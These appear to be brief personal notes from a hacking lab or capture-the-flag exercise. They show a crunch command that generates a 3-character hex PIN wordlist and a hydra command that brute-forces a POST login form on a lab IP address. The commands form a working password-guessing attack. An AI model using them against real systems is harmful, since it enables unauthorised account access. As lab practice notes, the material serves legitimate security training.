`crunch` - generate wordlists, PINs, etc.
```sh
crunch 3 3 0123456789ABCDEF -o 3digits.txt
```

`hydra` bruteforce a POST login form
```sh
hydra -l '' -P 3digits.txt -I -f 10.10.234.186 -s 8000 http-post-form "/login.php:pin=^PASS^:Access denied" 
```
![](Pasted%20image%2020231203211639.png)